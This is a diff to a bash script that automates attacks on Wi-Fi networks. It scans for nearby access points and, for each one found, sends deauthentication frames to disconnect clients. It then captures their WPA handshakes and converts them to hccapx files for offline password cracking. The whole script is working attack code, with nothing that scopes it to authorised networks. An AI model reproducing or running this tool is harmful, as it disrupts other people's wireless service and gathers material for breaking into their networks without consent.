@@ -1,45 +1,55 @@
 #!/bin/bash
 
-checkHandshakes(){
-        echo ""
-        echo "Clean cap file.."
-        output=`wpaclean /home/kali/cleanshakes.cap /home/kali/shakes-01.cap` #> /dev/null`
 
-        if [[ "$output" == *"Net"* ]]; then
-                echo "Handshakes detected!!!"
+checkUtils(){
+	echo "Check utils"
+	if [ ! -f /bin/cap2hccapx ] 
+	then
+		echo "No cap2hccapx"
+		echo "Please, install cap2hccapx:"
+		echo "sudo apt install hcxtools"
+		echo "sudo cp /usr/lib/hashcat-utils/cap2hccapx.bin /bin/cap2hccapx"
+	fi
+
+}
+
+checkHandshakes(){
+        echo "Check handshakes..."
+	output=`cap2hccapx /home/kali/shakes-01.cap /home/kali/cleanshakes.hccapx`
+	echo $output
+        if [[ "$output" == *"Written 0"* ]] || [[ "$output" == *"Networks detected: 0"* ]]; then
+                echo "No handshakes" 
+		rm /home/kali/cleanshakes.hccapx > /dev/null
+	else
+		echo "Handshakes detected!!!"
                 if [[ -d /home/kali/shakes ]]
                 then
 
                         if [[ `ls /home/kali/shakes/ | wc -l` -ne 0 ]]; then          
                                 lastNum=$(($(head -n 1 /home/kali/shakes/.counter)+1))                                 
-                                aircrack-ng -j /home/kali/shakes/shake${lastNum} /home/kali/cleanshakes.cap > /dev/null
+				mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake${lastNum}
                                 echo $lastNum > /home/kali/shakes/.counter
                         else                            
-                                mkdir /home/kali/shakes/                                                      
-                                aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
+				mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
                                 touch /home/kali/shakes/.counter     
                                 echo "1" > /home/kali/shakes/.counter
                         fi
                 else                           
                         mkdir /home/kali/shakes                                                       
-                        aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
+			mv /home/kali/cleanshakes.hccapx /home/kali/shakes/shake1
                         touch /home/kali/shakes/.counter     
                         echo "1" > /home/kali/shakes/.counter
                 fi
-
-        	rm /home/kali/cleanshakes.cap
-        else
-                echo "No handshakes" 
         fi                    
-        rm /home/kali/shakes-*
+        echo ""
 }
 
 active(){
-	trap "rm /home/kali/sha*" EXIT
+	trap "rm /home/kali/sha* > /dev/null;rm /home/kali/cleanshakes.hccapx > /dev/null" EXIT
 	airmon-ng check kill
-	airmon-ng start wlan1
-	echo "Collect AP"
-  	timeout 15 airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null 
+	airmon-ng start wlan0
+	echo "Collect AP..."
+  	timeout 15 airodump-ng -w /home/kali/shakesCollector wlan0mon < /dev/null > /dev/null 
 	counter=0
 
 	while read line
@@ -57,24 +67,24 @@ active(){
 		echo $bssid
 		echo $channel
 		
-		iwconfig wlan1 channel $channel
-		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1 < /dev/null > /dev/null &
-		aireplay-ng -a $bssid -0 10 wlan1
+		iwconfig wlan0mon channel $channel
+		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan0mon < /dev/null > /dev/null &
+		aireplay-ng -a $bssid -0 10 wlan0mon
 		sleep 10
 		checkHandshakes
-
-	done < /home/kali/shakes-01.csv
+        	rm /home/kali/shakes-* > /dev/null
+	done < /home/kali/shakesCollector-01.csv
 
 }
 
 passive(){
-	trap 'checkHandshakes' EXIT
+	trap 'checkHandshakes;rm /home/kali/shakes-*' EXIT
 
         airmon-ng check kill
-        airmon-ng start wlan1
+        airmon-ng start wlan0
 
         echo "Start airodump.."
-        airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null
+        airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null
 }
 
 if [ $# -lt 1 ]
@@ -82,7 +92,7 @@ then
 	echo "Please use -a or -p flag"
 	exit 1
 fi
-
+checkUtils
 while getopts "pa" opt
 do
 	case $opt in
